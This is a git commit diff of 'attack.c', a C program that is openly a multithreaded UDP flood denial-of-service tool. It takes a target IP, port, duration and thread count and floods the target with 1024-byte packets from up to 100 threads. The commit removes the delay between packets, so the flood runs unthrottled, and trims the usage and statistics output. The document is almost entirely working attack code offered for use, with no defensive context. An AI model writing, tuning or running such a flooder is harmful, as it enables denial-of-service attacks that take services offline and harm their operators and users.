d445639ac6340d24ea33fb2b685e288efafd81d9
ombhondave17-arch <ombhondave17@gmail.com>
2026-05-05 18:35:17 +0530

    Adjust thread count and packet size in attack.c

--- attack.c
+++ attack.c
@@ -10,66 +10,39 @@
 
 volatile int attack_active = 1;
 unsigned long long total_packets = 0;
-unsigned long long total_bytes = 0;
 char TARGET_IP[16];
 int TARGET_PORT;
-int THREAD_COUNT = 120;
+int THREAD_COUNT = 100;
 int DURATION_TIME = 60;
-int PACKET_SIZE = 1024;
-int DELAY_MS = 10;
 
 void* send_packets(void* arg) {
     int sock = socket(AF_INET, SOCK_DGRAM, 0);
     struct sockaddr_in addr;
-    char packet[PACKET_SIZE];
-    
-    memset(packet, 'X', PACKET_SIZE);
-    
+    char packet[1024];
+    memset(packet, 'X', 1024);
     addr.sin_family = AF_INET;
     addr.sin_port = htons(TARGET_PORT);
     inet_pton(AF_INET, TARGET_IP, &addr.sin_addr);
-    
     while(attack_active) {
-        sendto(sock, packet, PACKET_SIZE, 0, (struct sockaddr*)&addr, sizeof(addr));
+        sendto(sock, packet, 1024, 0, (struct sockaddr*)&addr, sizeof(addr));
         total_packets++;
-        total_bytes += PACKET_SIZE;
-        if(DELAY_MS > 0) {
-            usleep(DELAY_MS * 1000);
-        }
     }
     close(sock);
     return NULL;
 }
 
 int main(int argc, char *argv[]) {
-    if(argc < 4) {
-        printf("\nUsage: %s <IP> <PORT> <TIME> [THREADS]\n", argv[0]);
-        printf("Example: %s 1.2.3.4 80 60 120\n", argv[0]);
-        return 1;
-    }
-    
+    if(argc < 4) return 1;
     strcpy(TARGET_IP, argv[1]);
     TARGET_PORT = atoi(argv[2]);
     DURATION_TIME = atoi(argv[3]);
     if(argc >= 5) THREAD_COUNT = atoi(argv[4]);
-    
-    printf("\n[ATTACK] %s:%d | %ds | %d threads\n", TARGET_IP, TARGET_PORT, DURATION_TIME, THREAD_COUNT);
-    
+    printf("[ATTACK] %s:%d | %ds | %d threads\n", TARGET_IP, TARGET_PORT, DURATION_TIME, THREAD_COUNT);
     pthread_t tids[THREAD_COUNT];
-    
-    for(int i = 0; i < THREAD_COUNT; i++) {
-        pthread_create(&tids[i], NULL, send_packets, NULL);
-    }
-    
+    for(int i = 0; i < THREAD_COUNT; i++) pthread_create(&tids[i], NULL, send_packets, NULL);
     sleep(DURATION_TIME);
     attack_active = 0;
-    
-    for(int i = 0; i < THREAD_COUNT; i++) {
-        pthread_join(tids[i], NULL);
-    }
-    
-    printf("\n[DONE] Packets: %llu | Data: %.2f MB | Speed: %llu PPS\n", 
-           total_packets, total_bytes/(1024.0*1024.0), total_packets/DURATION_TIME);
-    
+    for(int i = 0; i < THREAD_COUNT; i++) pthread_join(tids[i], NULL);
+    printf("[DONE] Packets: %llu\n", total_packets);
     return 0;
 }
